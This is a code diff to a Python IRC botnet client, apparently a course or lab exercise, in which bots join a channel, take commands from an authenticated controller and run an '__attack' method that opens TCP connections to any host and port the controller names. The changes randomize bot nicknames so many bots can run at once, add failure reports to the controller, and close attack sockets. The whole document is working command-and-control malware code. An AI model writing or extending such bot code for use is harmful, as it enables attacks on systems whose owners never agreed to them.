@@ -7,7 +7,7 @@ import sys
 import string
 import socket
 import time
-
+import random
 
 class Bot_Client:
     def __init__(self, host, port, channel, secret_phrase):
@@ -16,7 +16,7 @@ class Bot_Client:
         self.channel = "#" + channel
         self.secret_phrase = secret_phrase
         #TODO figure out a way to assign unique usernames to bots
-        self.bot_nick = "robotnik"
+        self.bot_nick = "robotnik" + str(random.randint(1, 30))
         self.irc_socket = None
         self.controller = None
         self.controller_nick = None
@@ -39,7 +39,7 @@ class Bot_Client:
             self.receive_command(command)
 
         self.irc_socket.close()
-    
+
     def __attempt_connection(self):
         connected = False
         timeout = 5 # timeout (in seconds)
@@ -141,6 +141,8 @@ class Bot_Client:
     def __attack(self, host, port):
         self.attack_counter += 1
         if not check_port(port):
+            self.log("Error: Port: " + str(port) + " is not valid.")
+            self.send_to_user(self.controller_nick, "Attack Failed: Invalid Port")
             return
         port = int(port)
         attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -165,6 +167,7 @@ class Bot_Client:
             attack_socket.send((str(self.attack_counter) + \
                                " " + self.bot_nick).encode())
             self.send_to_user(self.controller_nick, "Attack Successful")
+        attack_socket.close()
 
     # sends the bot status to the controller
     def send_status(self):
